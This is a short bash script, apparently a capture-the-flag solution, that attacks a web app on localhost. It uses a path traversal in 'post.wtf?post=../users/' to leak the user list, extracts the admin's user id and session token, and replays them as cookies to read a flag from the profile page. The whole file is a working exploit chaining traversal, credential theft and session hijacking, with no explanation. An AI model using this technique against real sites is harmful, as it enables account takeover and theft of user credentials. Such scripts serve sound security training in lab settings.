HOST="http://localhost:8080"
USERS_LEAK='post.wtf?post=../users/'

curr_line=""

username="admin";


user_line=$(curl "$HOST/$USERS_LEAK" \
    | tail -n+8 | head -n-8 \
    | while read -r line; do
    if [[ $line = '</div>' ]]
    then # End of a user
        echo "${curr_line}";
        curr_line="":
    else
        curr_line="${curr_line}${line}";
    fi
done \
    | grep "$username");
    
user_id=$((grep --only-matching 'user=.*">' | head -c 10 | tail -c 5) <<< $user_line);
user_token=$((grep --only-matching 'post-body">.*</' | head -c-3 | tail -c+12) <<< $user_line);

curl "${HOST}/profile.wtf?user=$user_id" -H "Cookie: USERNAME=$username; TOKEN=$user_token" | grep --only-matching 'flag{.*}'
